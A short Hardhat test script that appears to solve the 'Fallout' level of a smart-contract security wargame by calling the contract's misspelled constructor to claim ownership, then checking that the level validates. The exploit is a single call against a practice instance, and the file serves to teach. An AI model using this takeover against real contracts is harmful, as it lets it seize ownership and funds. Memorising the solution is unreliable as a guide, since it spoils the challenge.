const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Fallout", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Fallout", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Simply call misspelled constructor
        await instance.connect(player).Fal1out();
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});